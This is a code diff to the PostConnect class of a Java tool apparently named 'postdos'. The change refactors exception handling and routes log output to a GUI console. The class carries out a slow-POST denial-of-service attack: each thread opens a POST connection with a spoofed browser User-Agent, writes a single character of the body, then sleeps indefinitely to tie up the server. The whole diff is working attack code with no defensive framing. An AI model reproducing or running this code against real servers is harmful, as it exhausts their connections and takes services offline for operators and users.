@@ -4,7 +4,9 @@
 package vn.kist.postdos;
 
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.net.HttpURLConnection;
+import java.net.ProtocolException;
 import java.net.URL;
 import java.util.Random;
 
@@ -36,14 +38,18 @@ public class PostConnect implements Runnable{
 		con = (HttpURLConnection) url.openConnection();
 	}
 	
-	public void setHeaders() throws Exception{
+	public void setHeaders() {
 		
-		getCon().setRequestMethod("POST");
+		try {
+			getCon().setRequestMethod("POST");
+		} catch (ProtocolException e) {
+			PostGui.setConsoleLog("[-] Exception: " + e);
+		}
 		getCon().setRequestProperty("User-Agent", "Mozilla/5.0");
 		getCon().setRequestProperty("Accept-Language", "en-US,en;q=0.5");
 		getCon().setDoOutput(true);
 		
-		if(PostGui.isRanParam()) {
+		if(PostGui.isRandom()) {
 			setParam(genParam());
 		} else {
 			setParam(PostGui.getParam());
@@ -51,13 +57,18 @@ public class PostConnect implements Runnable{
 		
 	}
 	
-	public void sendRequests() throws Exception {
+	public void sendRequests() {
 		
-		wr = new DataOutputStream(getCon().getOutputStream());
-		System.out.println("[+] Thread #" + Thread.currentThread().getName() + " sending...");
-		for (int foo = 0; foo < param.length(); foo++) {
-			wr.writeChar(param.charAt(foo));
-			Thread.sleep(Long.MAX_VALUE);
+		try {
+			wr = new DataOutputStream(getCon().getOutputStream());
+		
+			PostGui.setConsoleLog("[+] #" + Thread.currentThread().getName() + " sending...\r\n");
+			for (int foo = 0; foo < param.length(); foo++) {
+				wr.writeChar(param.charAt(foo));
+				Thread.sleep(Long.MAX_VALUE);
+			}
+		} catch (Exception e) {
+			PostGui.setConsoleLog("[-] Exception: " + e);
 		}
 	}
 	
